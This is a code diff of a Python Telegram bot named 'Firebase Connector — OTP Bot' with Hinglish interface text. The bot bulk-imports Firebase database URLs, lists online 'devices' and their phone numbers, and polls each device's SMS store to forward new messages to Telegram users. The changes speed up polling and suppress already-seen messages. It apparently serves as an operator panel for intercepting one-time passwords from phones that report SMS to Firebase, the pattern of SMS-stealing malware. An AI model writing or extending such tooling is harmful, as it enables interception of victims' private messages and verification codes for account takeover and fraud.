-                "⚠️ Bot ko us channel ka *admin* banana zaroori hai.\n"
-                "Ya fir private channel ID `-100xxxxx` use karo.",
+                "⚠️ Bot ko us channel ka *admin* banana zaroori hai.",
                 parse_mode="Markdown", reply_markup=admin_back_kb())
             return
 
-        # Build join URL
         join_url = ""
         invite_link = getattr(chat, "invite_link", None)
         username_field = getattr(chat, "username", None)
@@ -1823,7 +1747,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
         elif invite_link:
             join_url = invite_link
         else:
-            # Try to create invite link
             try:
                 invite = await context.bot.create_chat_invite_link(chat_id=chat.id)
                 join_url = invite.invite_link
@@ -1832,17 +1755,15 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if not join_url:
             await update.message.reply_text(
-                "❌ Join link generate nahi ho paya.\n\n"
-                "Bot ko us channel me *invite link create* karne ki permission do.",
-                parse_mode="Markdown", reply_markup=admin_back_kb())
+                "❌ Join link generate nahi ho paya.",
+                reply_markup=admin_back_kb())
             return
 
         REQUIRED_CHANNELS.append({
-            "id": str(chat.id),
-            "label": title,
-            "url": join_url,
+            "id": str(chat.id), "label": title, "url": join_url,
         })
         _save_required_channels()
+        _user_join_cache.clear()
         context.user_data.pop("admin_action", None)
         await update.message.reply_text(
             f"✅ *Force-Join Channel Added*\n\n"
@@ -1857,8 +1778,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.user_data.get("admin_action"):
         await admin_text_input(update, context)
-    else:
-        pass
 
 
 # ============================================================
@@ -1933,7 +1852,9 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                              fb_url: str = "", task_token=None, state: dict = None):
     started = time.monotonic()
     seen_fingerprints = set(baseline_fingerprints or ())
-    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
+    # 🛡️ FIRST CYCLE SUPPRESS — purane SMS forward mat karo
+    suppress_first_cycle = not bool(baseline_fingerprints)
+    session = await get_http_session()
     real_cid = device_id
     resolved_fb_url = fb_url
     stop_reason = None
@@ -1948,7 +1869,7 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
             return
         url_with_query = build_fb_endpoint(
             resolved_fb_url, f"messages/{real_cid}",
-            query='orderBy="$key"&limitToLast=50')
+            query='orderBy="$key"&limitToLast=10')
         url_plain = build_fb_endpoint(resolved_fb_url, f"messages/{real_cid}")
         while True:
             if not unlimited and (time.monotonic() - started >= SMS_MONITOR_DURATION):
@@ -1962,15 +1883,26 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                     stop_reason = "idle"
                     break
             data, status, err = await fb_get_json(session, url_with_query,
-                                                   retries=0, timeout=6)
+                                                   retries=0, timeout=3)
             if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
                 data, status, err = await fb_get_json(session, url_plain,
-                                                       retries=0, timeout=6)
+                                                       retries=0, timeout=3)
             if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
                 await asyncio.sleep(SMS_MONITOR_INTERVAL)
                 continue
-            pairs = _newest_with_keys(data, limit=50)
+            pairs = _newest_with_keys(data, limit=10)
             current_fps = [(k, m, _msg_fingerprint(k, m)) for k, m in pairs]
+
+            # 🛡️ SUPPRESS FIRST CYCLE
+            if suppress_first_cycle:
+                for _, _, fp in current_fps:
+                    seen_fingerprints.add(fp)
+                suppress_first_cycle = False
+                logger.info("[SMS MONITOR] baseline captured uid=%s count=%d",
+                            uid, len(seen_fingerprints))
+                await asyncio.sleep(SMS_MONITOR_INTERVAL)
+                continue
+
             new_msgs = [(k, m, fp) for k, m, fp in current_fps
                         if fp not in seen_fingerprints]
             new_msgs.sort(key=lambda x: str(x[0]))
@@ -2006,7 +1938,7 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                 except Exception as e:
                     logger.error("[SMS MONITOR] notify error uid=%s err=%r",
                                  uid, e, exc_info=True)
-            if len(seen_fingerprints) > 500:
+            if len(seen_fingerprints) > 200:
                 seen_fingerprints = set(fp for _, _, fp in current_fps)
             await asyncio.sleep(SMS_MONITOR_INTERVAL)
 
@@ -2041,10 +1973,6 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
     except Exception as e:
         logger.error("[SMS MONITOR] crashed uid=%s err=%r", uid, e, exc_info=True)
     finally:
-        try:
-            await session.close()
-        except Exception:
-            pass
         current_state = sms_monitor_state.get(uid)
         if current_state is state:
             sms_monitor_state.pop(uid, None)
@@ -2070,8 +1998,8 @@ def start_sms_monitor(bot, uid: int, chat_id: int, device_id: str,
         baseline_fingerprints=baseline_fingerprints,
         fb_url=fb_url, task_token=task_token, state=state))
     sms_monitor_tasks[uid] = task
-    logger.info("[SMS MONITOR] started uid=%s device=%s fb_url=%s baseline_count=%d",
-                uid, device_id, fb_url, len(baseline_fingerprints or ()))
+    logger.info("[SMS MONITOR] started uid=%s device=%s interval=%.1fs suppress=%s",
+                uid, device_id, SMS_MONITOR_INTERVAL, not bool(baseline_fingerprints))
 
 
 def _parse_prefixed(device_id: str):
@@ -2124,6 +2052,61 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             or data.startswith("admin_fb_delete:")):
         _stop_admin_panel_live_task(uid)
 
+    # ⚡ MANUAL FIREBASE REFRESH (Sirf Admin)
+    if data == "admin_manual_refresh":
+        try:
+            await q.edit_message_text(
+                "🔍 *Checking all Firebases...*\n\n"
+                "⏳ Please wait 5-15 seconds...",
+                parse_mode="Markdown")
+        except Exception:
+            pass
+
+        start_time = time.time()
+        try:
+            await refresh_global_device_cache()
+            elapsed = round(time.time() - start_time, 2)
+            _last_refresh_time = time.monotonic()
+
+            cache = global_device_cache
+            online = cache.get("online_count", 0)
+            offline = cache.get("offline_count", 0)
+            per_fb = cache.get("per_fb", {}) or {}
+            updated = cache.get("updated_at", "")
+
+            lines = [
+                "✅ *FIREBASE CHECK COMPLETE*",
+                "",
+                f"⏱️ Time: `{elapsed}s`",
+                f"🕒 Updated: `{updated}`",
+                "",
+                f"📊 *TOTALS*",
+                f"🟢 Online: `{online}`",
+                f"🔴 Offline: `{offline}`",
+                f"📱 Total: `{online + offline}`",
+                "",
+                "*PER FIREBASE:*",
+            ]
+            if per_fb:
+                for tag, counts in per_fb.items():
+                    o = int(counts.get("online", 0))
+                    f = int(counts.get("offline", 0))
+                    lines.append(f"• *{tag}* → 🟢 {o} | 🔴 {f} | 📊 {o+f}")
+            else:
+                lines.append("_No Firebase added yet._")
+
+            await q.edit_message_text(
+                "\n".join(lines),
+                parse_mode="Markdown",
+                reply_markup=admin_panel_kb())
+        except Exception as e:
+            logger.error("manual refresh failed: %s", e)
+            await q.edit_message_text(
+                f"❌ *Refresh Failed*\n\n`{str(e)[:200]}`",
+                parse_mode="Markdown",
+                reply_markup=admin_panel_kb())
+        return
+
     if data == "admin_toggle_maintenance":
         maintenance_mode = not maintenance_mode
         _save_maintenance_mode()
@@ -2157,11 +2140,10 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"👥 Total users: `{len(known_users)}`\n"
             f"🔗 Firebases: `{len(global_fb_list)}`\n"
             f"📢 Force-join channels: `{len(REQUIRED_CHANNELS)}`\n"
-            f"💾 Active sessions: `{len(user_sessions)}`\n"
             f"📨 Active SMS monitors: `{len(sms_monitor_tasks)}`\n"
-            f"⚡ Auto-refresh: `{ADMIN_DEVICE_REFRESH_INTERVAL}s`\n"
+            f"⚡ SMS poll: `{SMS_MONITOR_INTERVAL}s`\n"
             f"🌐 Flask: `{FLASK_HOST}:{FLASK_PORT}`\n"
-            f"🎁 Mode: `FREE`",
+            f"🎁 Mode: `FREE + Manual Refresh`",
             parse_mode="Markdown", reply_markup=admin_back_kb())
         return
 
@@ -2172,14 +2154,8 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["admin_action"] = "add_firebase"
         await q.edit_message_text(
             "➕ *BULK ADD FIREBASE*\n\n"
-            "Ek ya MULTIPLE Firebase URL bhejo —\n"
-            "aas-paas ka text automatic ignore hoga.\n\n"
-            "*Example (single):*\n"
-            "`https://xxx-default-rtdb.firebaseio.com`\n\n"
-            "*Example (bulk, text ke saath):*\n"
-            "`ye lo bhai url1 https://aaa.firebaseio.com aur ye "
-            "https://bbb-default-rtdb.firebasedatabase.app bhi add karo`\n\n"
-            "Detected URLs sab auto add ho jayenge (max 40 tak).",
+            "Ek ya MULTIPLE Firebase URL bhejo — aas-paas ka text auto ignore hoga.\n\n"
+            "*Example:*\n`https://xxx-default-rtdb.firebaseio.com`",
             parse_mode="Markdown", reply_markup=admin_back_kb())
         return
 
@@ -2251,8 +2227,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "admin_broadcast":
         context.user_data["admin_action"] = "broadcast"
         await q.edit_message_text(
-            "📢 *Broadcast*\n\n"
-            "Broadcast message bhejein. Sabhi users ko send hoga.",
+            "📢 *Broadcast*\n\nBroadcast message bhejein.",
             parse_mode="Markdown", reply_markup=admin_back_kb())
         return
 
@@ -2263,10 +2238,8 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Format bhejein:\n\n"
             "• `@channelusername`\n"
             "• `https://t.me/channelusername`\n"
-            "• `-1001234567890` (private channel)\n\n"
-            "⚠️ *Bot ko us channel ka admin banana zaroori hai.*\n\n"
-            "Public channel ke liye username kaafi hai.\n"
-            "Private channel ke liye ID do.",
+            "• `-1001234567890` (private)\n\n"
+            "⚠️ *Bot ko us channel ka admin banana zaroori hai.*",
             parse_mode="Markdown", reply_markup=admin_back_kb())
         return
 
@@ -2295,6 +2268,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 return
             removed = REQUIRED_CHANNELS.pop(index)
             _save_required_channels()
+            _user_join_cache.clear()
             await q.edit_message_text(
                 f"✅ *Channel Removed*\n\n"
                 f"📢 `{removed.get('label', removed.get('id'))}`\n\n"
@@ -2318,8 +2292,7 @@ async def _show_sms_safe(q, info: dict, device_id: str, updated_at: Optional[str
         fb_url = _find_fb_url_by_tag(q.from_user.id, parsed_tag)
         if not fb_url:
             await _safe_edit_callback_message(
-                q,
-                "❌ *Device info missing.*\n\nPlease tap REFRESH.",
+                q, "❌ *Device info missing.*\n\nPlease tap REFRESH.",
                 parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("🔄 REFRESH", callback_data="scan_active")],
@@ -2340,10 +2313,8 @@ async def _show_sms_safe(q, info: dict, device_id: str, updated_at: Optional[str
         await _safe_edit_callback_message(
             q,
             f"📭 *No SMS records found.*\n\n"
-            f"🌐 Firebase: `{tag}`\n"
-            f"📱 Device: `{real_cid}`",
-            parse_mode="Markdown",
-            reply_markup=sms_view_kb(device_id))
+            f"🌐 Firebase: `{tag}`\n📱 Device: `{real_cid}`",
+            parse_mode="Markdown", reply_markup=sms_view_kb(device_id))
         return
 
     lines = [f"📩 LAST {len(pairs)} SMS", "",
@@ -2374,7 +2345,7 @@ async def _show_sms_safe(q, info: dict, device_id: str, updated_at: Optional[str
                       "━━━━━━━━━━━━━━━━━━━━━━━"])
     text = "\n".join(lines)
     if len(text) > 3800:
-        text = text[:3800] + "\n\n... (truncated - too many SMS)"
+        text = text[:3800] + "\n\n... (truncated)"
 
     await _safe_edit_callback_message(
         q, text, parse_mode="Markdown",
@@ -2388,7 +2359,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
 
-    # Handle force verify
     if q.data == "force_verify":
         await force_verify_callback(update, context)
         return
@@ -2409,8 +2379,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "manage_firebase":
-        context.user_data["awaiting_url"] = False
-        sess["awaiting_fb_add"] = False
         await q.edit_message_text(
             f"🔗 *Manage Firebase*\n\n"
             f"Connected: {len(sess.get('fb_list', []))}/{MAX_FIREBASES}\n"
@@ -2420,8 +2388,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if data == "menu_back":
         stop_sms_monitor(uid)
-        context.user_data["awaiting_url"] = False
-        sess["awaiting_fb_add"] = False
         if not sess.get("fb_list"):
             await q.edit_message_text("Hii 👋\n\nWelcome to Firebase Connector",
                                       reply_markup=connect_inline_kb())
@@ -2447,11 +2413,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await _show_device_view(q, sess, current_device)
         else:
             if not sess.get("devices"):
-                await q.answer("No cached scan. Refreshing...", show_alert=False)
-                await scan_and_show(update, context, edit_target=q.message)
-                return
-            if len(sess.get("devices", {})) <= 1:
-                await q.edit_message_text("⏳ Scanning online devices...")
+                await q.answer("Refreshing...", show_alert=False)
                 await scan_and_show(update, context, edit_target=q.message)
                 return
             await _show_cached_device_list(q, sess)
@@ -2468,7 +2430,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await scan_and_show(update, context, edit_target=q.message, fb_idx=idx)
         except Exception as e:
             logger.error(f"scan firebase: {e}")
-            await q.edit_message_text("❌ Scan failed. Please try again.")
+            await q.edit_message_text("❌ Scan failed.")
         return
 
     if data.startswith("delete_fb:"):
@@ -2481,8 +2443,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             removed = fb_list.pop(idx)
             fb_list = [(url, f"FB{i+1}") for i, (url, _) in enumerate(fb_list)]
             sess["fb_list"] = fb_list
-            sess["active_fb_idx"] = min(sess.get("active_fb_idx", 0),
-                                          max(0, len(fb_list) - 1))
             sess["devices"] = {}
             stop_sms_monitor(uid)
             await q.edit_message_text(
@@ -2501,11 +2461,8 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             idx = int(data.split(":", 1)[1])
             fb_list = sess.get("fb_list", [])
             if 0 <= idx < len(fb_list):
-                sess["active_fb_idx"] = idx
                 await q.answer(f"Opening {fb_list[idx][1]}...")
-                await q.edit_message_text(
-                    f"⏳ Scanning {fb_list[idx][1]} for online devices...",
-                    parse_mode="Markdown")
+                await q.edit_message_text(f"⏳ Scanning {fb_list[idx][1]}...")
                 await scan_and_show(update, context, edit_target=q.message, fb_idx=idx)
             else:
                 await q.answer("Invalid Firebase.", show_alert=True)
@@ -2547,12 +2504,9 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             fb_url = _find_fb_url_by_tag(uid, parsed_tag)
             if fb_url:
                 info = {
-                    "fb_url": fb_url,
-                    "fb_tag": parsed_tag,
-                    "real_cid": parsed_cid,
-                    "phone": "",
-                    "online": True,
-                    "raw": {},
+                    "fb_url": fb_url, "fb_tag": parsed_tag,
+                    "real_cid": parsed_cid, "phone": "",
+                    "online": True, "raw": {},
                 }
                 sess.setdefault("devices", {})[device_id] = info
             else:
@@ -2578,12 +2532,9 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             fb_url = _find_fb_url_by_tag(uid, parsed_tag)
             if fb_url:
                 info = {
-                    "fb_url": fb_url,
-                    "fb_tag": parsed_tag,
-                    "real_cid": parsed_cid,
-                    "phone": "",
-                    "online": True,
-                    "raw": {},
+                    "fb_url": fb_url, "fb_tag": parsed_tag,
+                    "real_cid": parsed_cid, "phone": "",
+                    "online": True, "raw": {},
                 }
                 sess.setdefault("devices", {})[device_id] = info
             else:
@@ -2591,27 +2542,17 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 return
         phone = info.get("phone") or "N/A"
         stop_sms_monitor(uid)
-        baseline_fingerprints = set()
-        try:
-            baseline_pairs = await fetch_last_sms(
-                info.get("fb_url", ""), info.get("real_cid", device_id), limit=50)
-            baseline_fingerprints = {
-                _msg_fingerprint(key, message) for key, message in baseline_pairs}
-        except Exception as exc:
-            logger.warning("manual SMS baseline unavailable: %s", exc)
         start_sms_monitor(
             context.bot, uid, q.message.chat_id, device_id,
-            baseline_fingerprints=baseline_fingerprints,
+            baseline_fingerprints=set(),
             fb_url=info.get("fb_url", ""))
         await q.edit_message_text(
             "📨 *SMS Monitor Started*\n\n"
             f"📱 *Device:* `{info.get('real_cid', device_id)}`\n"
             f"📞 *Number:* `{phone}`\n\n"
-            "⏱️ *Duration:* 5 minutes\n"
-            "⚡ *Speed:* 1 sec polling\n\n"
-            "🔔 Har naya SMS turant yahan forward hoga.",
-            parse_mode="Markdown",
-            reply_markup=sms_monitor_kb(device_id))
+            "⚡ *Speed:* Fast polling\n\n"
+            "🔔 Naya SMS turant yahan forward hoga.",
+            parse_mode="Markdown", reply_markup=sms_monitor_kb(device_id))
         state = sms_monitor_state.get(uid)
         if state is not None:
             state["monitor_message_id"] = q.message.message_id
@@ -2640,7 +2581,6 @@ async def scan_and_show(update, context, edit_target=None, fb_idx=None):
     online_count = len(devices)
     total_count = online_count + offline_count
     sess["devices"] = devices
-    sess["mode"] = "online"
     sess["device_page"] = 0
     sess["online_count"] = online_count
     sess["offline_count"] = offline_count
@@ -2651,7 +2591,7 @@ async def scan_and_show(update, context, edit_target=None, fb_idx=None):
             f"📊 TOTAL : {total_count}\n"
             f"🔗 Firebase: {len(sess['fb_list'])}\n\n"
             "Tap a device below.")
-    markup = (device_list_kb(devices, mode="online", page=0)
+    markup = (device_list_kb(devices, page=0)
               if devices else firebase_connected_kb(uid))
     if edit_target:
         await edit_target.edit_text(text, parse_mode="Markdown", reply_markup=markup)
@@ -2661,7 +2601,7 @@ async def scan_and_show(update, context, edit_target=None, fb_idx=None):
 
 
 # ============================================================
-# MAINTENANCE LOOP (only cleanup now)
+# MAINTENANCE LOOP (cleanup only)
 # ============================================================
 async def _maintenance_loop(bot):
     while True:
@@ -2674,6 +2614,11 @@ async def _maintenance_loop(bot):
             for uid, task in list(admin_panel_live_tasks.items()):
                 if task.done():
                     admin_panel_live_tasks.pop(uid, None)
+            # Cleanup expired join cache
+            now = time.time()
+            for uid, (_, ts) in list(_user_join_cache.items()):
+                if now - ts > JOIN_CACHE_TTL * 2:
+                    _user_join_cache.pop(uid, None)
         except asyncio.CancelledError:
             raise
         except Exception as e:
@@ -2697,7 +2642,8 @@ async def _post_stop(app):
     if admin_panel_live_tasks:
         await asyncio.gather(*admin_panel_live_tasks.values(), return_exceptions=True)
     admin_panel_live_tasks.clear()
-    logger.info("Monitor loops cancelled.")
+    await close_http_session()
+    logger.info("Monitor loops cancelled + HTTP session closed.")
 
 
 async def _telegram_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
@@ -2714,13 +2660,14 @@ async def _telegram_error_handler(update: object, context: ContextTypes.DEFAULT_
 def main():
     global bot_instance
     print("=" * 60)
-    print("  Firebase Connector — OTP Bot FREE + Force Join")
+    print("  🔥 Firebase Connector — OTP Bot FREE Edition")
     print(f"  Max Firebases: {MAX_FIREBASES}")
     print(f"  Global FBs: {len(global_fb_list)}")
     print(f"  Force-join channels: {len(REQUIRED_CHANNELS)}")
-    print(f"  Mode: 🎁 FREE (No Refer, No Captcha, No Credits)")
-    print(f"  Auto-refresh: {ADMIN_DEVICE_REFRESH_INTERVAL}s ⚡")
-    print(f"  SMS Monitor idle timeout: {SMS_MONITOR_IDLE_TIMEOUT // 60} minutes")
+    print(f"  Mode: 🎁 FREE (No Refer / No Credits / No Captcha)")
+    print(f"  Auto device refresh: ❌ DISABLED (sirf admin manual)")
+    print(f"  SMS poll interval: {SMS_MONITOR_INTERVAL}s (⚡ fast OTP)")
+    print(f"  First-cycle suppress: ✅ (purane SMS skip)")
     print(f"  Flask keep-alive: {FLASK_HOST}:{FLASK_PORT} 🌐")
     print("=" * 60)
 
@@ -2733,7 +2680,7 @@ def main():
     app.add_handler(CommandHandler("admin", admin_cmd))
     app.add_handler(CallbackQueryHandler(
         admin_callback,
-        pattern=r"^admin_(back|stats|add_firebase|manage_fb|broadcast|toggle_maintenance|add_channel|channels|remove_channel:\d+|fb_refresh:\d+|fb_delete:\d+|fb_info:\d+)$"))
+        pattern=r"^admin_(back|stats|add_firebase|manage_fb|broadcast|toggle_maintenance|add_channel|channels|manual_refresh|remove_channel:\d+|fb_refresh:\d+|fb_delete:\d+|fb_info:\d+)$"))
     app.add_handler(CallbackQueryHandler(generate_number_callback,
                                           pattern="^generate_number$"))
     app.add_handler(CallbackQueryHandler(
@@ -2754,17 +2701,14 @@ def main():
         except Exception as exc:
             logger.warning("could not cache bot username: %s", exc)
             BOT_USERNAME = "YourBot"
+        await get_http_session()
+        logger.info("⚡ Global HTTP session ready")
         application.bot_data["maintenance_task"] = asyncio.create_task(
             _maintenance_loop(application.bot))
-        application.bot_data["device_refresh_task"] = asyncio.create_task(
-            _global_device_refresh_loop())
+        # 📌 Auto device refresh hata diya — sirf admin manual button se refresh hoga
 
     async def _post_stop_with_cleanup(application):
         task = application.bot_data.pop("maintenance_task", None)
-        if task and not task.done():
-            task.cancel()
-            await asyncio.gather(task, return_exceptions=True)
-        task = application.bot_data.pop("device_refresh_task", None)
         if task and not task.done():
             task.cancel()
             await asyncio.gather(task, return_exceptions=True)
@@ -2772,7 +2716,7 @@ def main():
 
     app.post_init = _post_init
     app.post_shutdown = _post_stop_with_cleanup
-    print("Bot running...")
+    print("🚀 Bot running...")
     app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
